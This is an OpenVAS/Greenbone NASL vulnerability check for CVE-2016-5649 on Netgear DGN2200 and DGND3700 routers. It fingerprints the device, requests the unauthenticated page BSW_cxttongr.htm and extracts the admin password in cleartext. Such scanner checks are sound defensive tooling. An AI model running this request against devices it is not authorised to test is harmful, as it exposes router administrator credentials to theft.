if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106497" );
	script_version( "2021-09-08T14:01:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-08 14:01:33 +0000 (Wed, 08 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-01-06 12:45:06 +0700 (Fri, 06 Jan 2017)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-09 23:18:00 +0000 (Wed, 09 Oct 2019)" );
	script_cve_id( "CVE-2016-5649" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Netgear DGN2000, DGND3700 Password Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Netgear DGN2200 and DGND3700 are prone to an admin password disclosure
  vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a HTTP request and checks the response." );
	script_tag( name: "insight", value: "A vulnerability in the 'BSW_cxttongr.htm' page allows a remote
  unauthenticated attacker to access to read the admin password in cleartext." );
	script_tag( name: "impact", value: "An unauthenticated attacker can obtain the admin password." );
	script_tag( name: "affected", value: "Netgear DGN2200 and Netgear DGND3700." );
	script_tag( name: "solution", value: "Update for DGN2200 to firmware version 1.0.0.52 or later and for
  DGND3700 to firmware 1.0.0.28 or later." );
	script_xref( name: "URL", value: "https://cxsecurity.com/issue/WLB-2017010027" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
res = http_get_cache( port: port, item: "/" );
if(!IsMatchRegexp( res, "Basic realm=\"NETGEAR.DGN(2200|D3700)" )){
	exit( 0 );
}
req = http_get( port: port, item: "/BSW_cxttongr.htm" );
res = http_keepalive_send_recv( port: port, data: req );
passwd = eregmatch( pattern: "<b>Success \"([^\"]+)", string: res );
if(ContainsString( res, "Your wired connection to the Internet is working!" ) && !isnull( passwd[1] )){
	report = "It was possible to obtain the admin password: " + passwd[1] + "\\n";
	report += http_report_vuln_url( port: port, url: "/BSW_cxttongr.htm" );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

